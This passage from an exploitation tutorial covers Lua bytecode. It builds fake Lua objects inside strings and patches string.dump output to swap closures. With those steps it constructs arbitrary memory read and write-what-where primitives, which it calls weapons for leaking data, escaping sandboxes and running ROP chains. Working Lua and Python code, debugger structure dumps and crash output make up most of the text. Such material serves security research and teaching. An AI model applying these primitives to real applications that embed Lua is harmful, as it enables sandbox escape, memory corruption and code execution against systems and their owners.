<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Convert little endian uint64 to char[8]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ub8</span>(n)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">local</span> t <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span> <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">local</span> b <span style="color:#f92672">=</span> n <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>      t[i] <span style="color:#f92672">=</span> string.char(b)
</span></span><span style="display:flex;"><span>      n <span style="color:#f92672">=</span> (n <span style="color:#f92672">-</span> b) <span style="color:#f92672">/</span> <span style="color:#ae81ff">256</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> table.concat(t)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">--  next + tt/marked/extra/padding/hash + len</span>
</span></span><span style="display:flex;"><span>fakeStr <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x1337</span>) 
</span></span></code></pre></div><h4 id="2-fake-array-of-tvalues">2. Fake Array of TValues</h4>
<p>Next, we need to create the <code>TValue</code> that points to this <code>TString</code>, as we already know, <code>TValues</code> have two parts, the <code>Value</code> and the <code>type</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> ptype <span style="color:#f92672">/</span>o TValue
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">lua_TValue</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      0      |       8 */</span>    Value value_;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      8      |       4 */</span>    <span style="color:#66d9ef">int</span> tt_;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* XXX  4-byte padding   */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* total size (bytes):   16 */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So we have to create a string with <strong>two 64 bit values</strong>, the first will be a <em>pointer</em> to the fake <code>TString</code> we created before, and the second the type of the <code>TValue</code></p>

<div class="alert alert-warning">Remember that a <code>TString</code> has a header of <strong>24 bytes before the user data</strong>, so we need to take that into account while calculating pointers to the content of the string
</div>

<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Value + Type (LUA_TSTRING = 4)</span>
</span></span><span style="display:flex;"><span>fakeTValueArray <span style="color:#f92672">=</span> ub8(addr_of(fakeStr) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">4</span>)
</span></span></code></pre></div><p>If we wanted to add another fake object, we just have to concat it as this is supposed to be an array of <code>TValues</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Value + Type (LUA_TSTRING = 4) / Value + Type (LUA_TNUMBER = 3)</span>
</span></span><span style="display:flex;"><span>fakeTValueArray <span style="color:#f92672">=</span> ub8(addr_of(fakeStr) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">..</span>  ub8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">3</span>)
</span></span></code></pre></div><h4 id="3-fake-proto">3. Fake Proto</h4>
<p>Then we need to create a <strong>Fake Proto</strong> that points to our fake array of <code>TValues</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> ptype <span style="color:#f92672">/</span>o Proto
</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Proto</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      0      |       8 */</span>    GCObject <span style="color:#f92672">*</span>next;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      8      |       1 */</span>    lu_byte tt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      9      |       1 */</span>    lu_byte marked;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* XXX  6-byte hole      */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     16      |       8 */</span>    TValue <span style="color:#f92672">*</span>k;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     24      |       8 */</span>    Instruction <span style="color:#f92672">*</span>code;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     32      |       8 */</span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Proto</span> <span style="color:#f92672">**</span>p;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     40      |       8 */</span>    <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>lineinfo;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     48      |       8 */</span>    LocVar <span style="color:#f92672">*</span>locvars;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     56      |       8 */</span>    Upvaldesc <span style="color:#f92672">*</span>upvalues;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     64      |       8 */</span>    <span style="color:#66d9ef">union</span> <span style="color:#a6e22e">Closure</span> <span style="color:#f92672">*</span>cache;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     72      |       8 */</span>    TString <span style="color:#f92672">*</span>source;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     80      |       4 */</span>    <span style="color:#66d9ef">int</span> sizeupvalues;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     84      |       4 */</span>    <span style="color:#66d9ef">int</span> sizek;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     88      |       4 */</span>    <span style="color:#66d9ef">int</span> sizecode;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     92      |       4 */</span>    <span style="color:#66d9ef">int</span> sizelineinfo;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     96      |       4 */</span>    <span style="color:#66d9ef">int</span> sizep;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    100      |       4 */</span>    <span style="color:#66d9ef">int</span> sizelocvars;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    104      |       4 */</span>    <span style="color:#66d9ef">int</span> linedefined;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    108      |       4 */</span>    <span style="color:#66d9ef">int</span> lastlinedefined;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    112      |       8 */</span>    GCObject <span style="color:#f92672">*</span>gclist;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    120      |       1 */</span>    lu_byte numparams;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    121      |       1 */</span>    lu_byte is_vararg;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*    122      |       1 */</span>    lu_byte maxstacksize;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* XXX  5-byte padding   */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* total size (bytes):  128 */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In our case, as we are only interested in controlling the <code>k</code> pointer (the pointer to the constants), we can do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">-- Fake proto that points the constants array</span>
</span></span><span style="display:flex;"><span>fakeProto <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(addr_of(fakeTValueArray) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>)
</span></span></code></pre></div><h4 id="4-fake-lclosure">4. Fake LClosure</h4>
<p>Finally, we create a fake <code>LClosure</code> that points to our fake <code>Proto</code> structure. As the user content of a string perfectly aligns with the location of the <code>Proto</code> pointer
in a real <code>LClosure</code>, creating it is straighforward:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>fakeClosure <span style="color:#f92672">=</span> ub8(addr_of(fakeProto) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>)
</span></span></code></pre></div><p>With this fake <code>LClosure</code>, we now have all the parts needed to craft an object. We will update the code that replaces the <code>LClosure</code> with the following that also
returns the crafted object</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>craft_object <span style="color:#f92672">=</span> string.dump(<span style="color:#66d9ef">function</span>(closure)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">local</span> target
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">function</span>(closure) <span style="color:#75715e">-- [1] target points to this function LClosure</span>
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">function</span>(closure)
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">-- [2] The inner function overwrites the outer function LClosure</span>
</span></span><span style="display:flex;"><span>      target <span style="color:#f92672">=</span> closure
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>)(closure)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">-- [3] The LOADK opcode reads the constant</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">-- from our fake LCLosure array of constants,</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">-- so instead of 42 this returns our fake object</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">42</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- We need to return an additional value to prevent a TAILCALL</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- that would mess up with the Call frame</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>)(closure), <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- Replace the stack index of target upval to point to the LCLosure</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- of the first function</span>
</span></span><span style="display:flex;"><span>craft_object <span style="color:#f92672">=</span> craft_object:gsub(<span style="color:#e6db74">&#34;(target</span><span style="color:#ae81ff">\x00\x01\x00\x00\x00\x01</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;%1</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>craft_object <span style="color:#f92672">=</span> load(craft_object)
</span></span></code></pre></div><p>Notice how we both return the result of the inner function (the crafted object) and a constant <code>1337</code>. We do this because when doing <code>return function()</code>, Lua uses a <code>TAILCALL</code> opcode to do the call. This opcode allows <strong>infinite recursion</strong> without growing the stack, as the current call frame will be used for the inner function.</p>
<p>This is <strong>not what we want</strong>, the change of frame needs to happen so our fake <code>LClosure</code> gets used as the current frame. By also returning a constant we prevent Lua from using a <code>TAILCALL</code> operation, <strong>forcing a change of frame</strong>.</p>
<p>With this updated piece of code, we just have to call the <code>craft_object</code> primitive with our fake <code>LCLosure</code> to obtain our fake object.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>read_primitive <span style="color:#f92672">=</span> craft_object(fakeClosure)
</span></span><span style="display:flex;"><span>print(string.format(<span style="color:#e6db74">&#34;Size of string: %x&#34;</span>, <span style="color:#f92672">#</span>read_primitive))
</span></span><span style="display:flex;"><span><span style="color:#75715e">--Output: Size of string: 1337</span>
</span></span></code></pre></div><h3 id="the-tables-have-turned">The Tables Have Turned</h3>
<p>From this point, with the ability to create fake objects, all the features of Lua are now your <strong>weapons</strong>:</p>
<ul>
<li><strong>TStrings</strong>: allow to <strong>leak data</strong></li>
<li><strong>Tables</strong>: can be used to write data to arbitrary addresses</li>
<li><strong>CCLosure/Light C Functions</strong>: allow to <em>obtain control of the instruction pointer</em>. Which has multiple uses:
<ul>
<li><strong>Bypass sandboxes</strong>: we can recover access to Lua functions that might be sandboxed but still present in the binary by pointing a fake function to its address</li>
<li><strong>Execute ROP Chains</strong>: as we control the instruction pointer, we can execute <em>ROP chains</em></li>
</ul>
</li>
</ul>
<p>The path to take will depend both on your goals and the application where Lua is embedded.</p>
<h3 id="generic-primitives">Generic Primitives</h3>
<h4 id="finishing-our-read-primitive">Finishing our read primitive</h4>
<p>Previously, we created our <strong>first fake object</strong>, a <code>TString</code>. We already said that this is a powerful fake object, as it can be used to leak data, so let&rsquo;s finish building this read primitive.</p>
<p>To do this, we start by updating the size of our fake string from <code>0x1337</code> to a bigger number, so we can reach more data from its position.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#75715e">--  next + tt/marked/extra/padding/hash + len</span>
</span></span><span style="display:flex;"><span>fakeStr <span style="color:#f92672">=</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x0</span>) <span style="color:#f92672">..</span> ub8(<span style="color:#ae81ff">0x20000000000000</span>) 
</span></span></code></pre></div><p>Now, we need to create a function that given a fake string, tries to read from an address we provide. As we already know, Lua assumes that the string is located after the <code>TString</code> header, that means that <strong>we are limited to leaking data after the header</strong>. As <code>TStrings</code> are located in the <em>heap</em>, we will only be able to read data located in the heap or after it.</p>
<p>The following code can be used to read data from an address we provide given a fake string that is within reach of the target:</p>

<div class="alert alert-warning">In Lua, <strong>Strings are indexed starting from 1</strong>. This means that <code>str:sub(0, 1)</code> and <code>str:sub(1, 1)</code> return the same character. To take that into account we will consider the header of the <code>TString</code> one byte smaller
</div>

<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">read</span>(fake_string, addr, size)
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- First we calculate if the address is reachable from our position</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">local</span> relative_addr <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> (addr_of(fake_string) <span style="color:#f92672">+</span> <span style="color:#ae81ff">23</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> relative_addr <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>      print(<span style="color:#e6db74">&#34;[-] Cannot read from &#34;</span> <span style="color:#f92672">..</span> addr)
</span></span><span style="display:flex;"><span>      error()
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Then we obtain the part of the string where the data is located</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> fake_string:sub(relative_addr, relative_addr <span style="color:#f92672">+</span> size <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><h4 id="building-a-write-what-where-primitive">Building a Write-What-Where Primitive</h4>
<p>In addition to leaking memory, we would like to <strong>corrupt memory</strong> so we can alter the behaviour of the program.</p>
<p>There are multiple ways to do this, so we are going to do the one that I think is the <strong>simplest</strong>.</p>
<p>The idea is to create a <em>fake UpValue</em> that points to the address we want to write. By doing this, Lua will think that the address we provided contains a <code>TValue</code>, so this is similar to the way we crafted fake objects,
but the diference is that instead of retrieving this fake object, we are going to <strong>overwrite it with a numeric value</strong>.</p>
<p><em>Why are we going to do this?</em> Because writing to a variable means to change the <strong>underlying TValue</strong> with a new <code>TValue</code> that represents the new object. As Lua thinks the address we provide contains the <code>TValue</code>
of the variable we are writing to, Lua is going to write the new <code>TValue</code> in that position, and as we already know, <strong>numeric values are stored inline</strong> in the <code>TValue</code> structure, so <strong>we control the first 8 bytes
of the structure that gets written</strong> to the address provided.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>write_primitive <span style="color:#f92672">=</span> string.dump(<span style="color:#66d9ef">function</span>(closure, value)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">local</span> target
</span></span><span style="display:flex;"><span>  (<span style="color:#66d9ef">function</span>(closure, value) <span style="color:#75715e">-- [1] target points to this function LClosure</span>
</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">function</span>(closure)
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">-- [2] The inner function overwrites the outer function LClosure</span>
</span></span><span style="display:flex;"><span>      target <span style="color:#f92672">=</span> closure
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">end</span>)(closure)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">-- [3] Target now points to the address we want to write to.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">-- Changing its value means writting a TValue in that address</span>
</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> value
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">end</span>)(closure, value)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>)
</span></span><span style="display:flex;"><span>write_primitive <span style="color:#f92672">=</span> write_primitive:gsub(<span style="color:#e6db74">&#34;(target</span><span style="color:#ae81ff">\x00\x01\x00\x00\x00\x01</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;%1</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>write_primitive <span style="color:#f92672">=</span> load(write_primitive)
</span></span></code></pre></div><p>Unfortunately, in the process we will also <strong>corrupt the next 8 bytes with the type of the TValue</strong>, but this might be okay depending on where we are writting to.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">lua_TValue</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      0      |       8 */</span>    Value value_;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      8      |       4 */</span>    <span style="color:#66d9ef">int</span> tt_;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* XXX  4-byte padding   */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* total size (bytes):   16 */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Implementation is really simple. We start by creating a fake <code>UpVal</code> structure inside a string that points to the address where we want to write:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> ptype <span style="color:#f92672">/</span>o UpVal
</span></span><span style="display:flex;"><span>type <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">UpVal</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      0      |       8 */</span>    GCObject <span style="color:#f92672">*</span>next;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      8      |       1 */</span>    lu_byte tt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*      9      |       1 */</span>    lu_byte marked;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* XXX  6-byte hole      */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     16      |       8 */</span>    TValue <span style="color:#f92672">*</span>v;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     24      |      16 */</span>    <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                    16 */</span>        TValue value;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*                    16 */</span>        <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     24      |       8 */</span>            <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">UpVal</span> <span style="color:#f92672">*</span>prev;
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*     32      |       8 */</span>            <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">UpVal</span> <span style="color:#f92672">*</span>next;
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">/* total size (bytes):   16 */</span>
</span></span><span style="display:flex;"><span>      } l;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/* total size (bytes):   16 */</span>
</span></span><span style="display:flex;"><span>  } u;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* total size (bytes):   40 */</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>That means the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span> <span style="color:#75715e">-- next/tt/marked + Address of the TValue (v)</span>
</span></span><span style="display:flex;"><span>fakeUpVal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDD&#34;</span><span style="color:#f92672">..</span> ub8(addr)
</span></span></code></pre></div><p>Then, is just a matter of creating a fake <code>LClosure</code> where we control the <code>UpVals</code> array</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span> <span style="color:#75715e">-- proto + upvals</span>
</span></span><span style="display:flex;"><span>fakeClosure <span style="color:#f92672">=</span> ub8(addr_of(<span style="color:#e6db74">&#34;MemoryCorruption&#34;</span>)) <span style="color:#f92672">..</span> ub8(addr_of(fakeUpVal) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>)
</span></span></code></pre></div><p>Our primitive will be like the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write</span>(addr, value)
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- The Fake Upval points to the destination of the write</span>
</span></span><span style="display:flex;"><span>  fakeUpVal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;AAAABBBBCCCCDDDD&#34;</span><span style="color:#f92672">..</span> ub8(addr) <span style="color:#75715e">-- next/tt/marked + v</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">-- Fake closure that we use to overwrite the real closure</span>
</span></span><span style="display:flex;"><span>  fakeClosure <span style="color:#f92672">=</span> ub8(addr_of(<span style="color:#e6db74">&#34;MemoryCorruption&#34;</span>)) <span style="color:#f92672">..</span> ub8(addr_of(fakeUpVal) <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>) <span style="color:#75715e">-- proto + upvals</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  write_primitive(fakeClosure, value)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">0x4545454545</span>, <span style="color:#ae81ff">0x5050505050</span>)
</span></span></code></pre></div><p>With these changes, we now have an arbitrary write primitive. However, <strong>floating-point numbers</strong> strike again&hellip;</p>
<pre tabindex="0"><code>Program received signal SIGSEGV, Segmentation fault.
0x000000000041a267 in luaV_execute (L=0x43e2a0) at lvm.c:662
*RAX  0x4545454545
 RBX  0
 RCX  1
*RDX  0x4254141414140000
[ DISASM / x86-64 / set emulate on ]
  0x41a267 &lt;luaV_execute+1416&gt;     mov    qword ptr [rax], rdx
   0x41a26a &lt;luaV_execute+1419&gt;     mov    rax, qword ptr [rbp - 0x338]
   0x41a271 &lt;luaV_execute+1426&gt;     mov    edx, dword ptr [rax + 8]
   0x41a274 &lt;luaV_execute+1429&gt;     mov    rax, qword ptr [rbp - 0x340]
   0x41a27b &lt;luaV_execute+1436&gt;     mov    dword ptr [rax + 8], edx
</code></pre><h5 id="episode-v---doubles-strike-back">Episode V - Doubles Strike Back</h5>
<p>Now we have the <em>opposite problem</em> to the one we explained at 
<a href="#ieee-754-double-precision" rel="noopener">IEEE-754 Double-precision</a>
. We have a double that we want to transform into
an integer. As we already know, Lua only uses doubles, so we have to play with the encoding of doubles to obtain the binary representation that we are looking for</p>
<p>In this case, there is an easy reasoning to obtain this transformation. We are gonna assume that we <strong>only want to write values that fit the mantissa</strong> of a double, as
its not that useful to write incorrect data.</p>
<p>That means that <strong>we want an exponent full of zeroes</strong>. As we already know, that is an especial value in <em>floating-point numbers</em> that means that it is a <strong>denormalized number</strong>, that is, a <strong>very small number</strong>. <em>What is the smallest number we can have?</em> In the case of denormalized numbers, the value of a double is calculated as follows:</p>
<pre tabindex="0"><code>(-1)**sign * 2**(1-1023) * 0.mantissa = (-1)**sign * 2**-1022 * 0.mantissa
</code></pre><p>So it basically is <code>2**-1022 * smallest_mantissa_possible</code>. <em>What is the smallest mantissa possible?</em> As we have 52 bits of precision, that would be <code>2**-52</code>. So that means that the
smallest number representable is:</p>
<pre tabindex="0"><code>(-1)**sign * 2**-1022 * 2**-52 = (-1)**sign * 2**-1074
</code></pre><p>We can check this with the same Python code we used to convert from <code>double</code> to <code>integer</code></p>
<pre tabindex="0"><code>Exponent: 00000000000
Mantissa: 0000000000000000000000000000000000000000000000000001
Number:   0x1
</code></pre><p>As expected, the exponent is zero, as it is a denormalized number, and only the last bit is set, so it is the <strong>smallest representable number</strong>.</p>
<p>All this means that <em>if we multiply our double with this value</em>, we will get <strong>a double representation that encodes our number in the same way as an integer</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>double <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x50505050</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">**-</span><span style="color:#ae81ff">1074</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>double_bytes <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;d&#39;</span>, double)
</span></span><span style="display:flex;"><span>number <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;q&#34;</span>, double_bytes)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Take into account that 2 bytes is the prefix</span>
</span></span><span style="display:flex;"><span>encoded <span style="color:#f92672">=</span> format(number, <span style="color:#e6db74">&#34;#065b&#34;</span>)[<span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exponent <span style="color:#f92672">=</span> encoded[:<span style="color:#ae81ff">11</span>]
</span></span><span style="display:flex;"><span>mantissa <span style="color:#f92672">=</span> encoded[<span style="color:#ae81ff">11</span>:]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Exponent: </span><span style="color:#e6db74">{</span>exponent<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
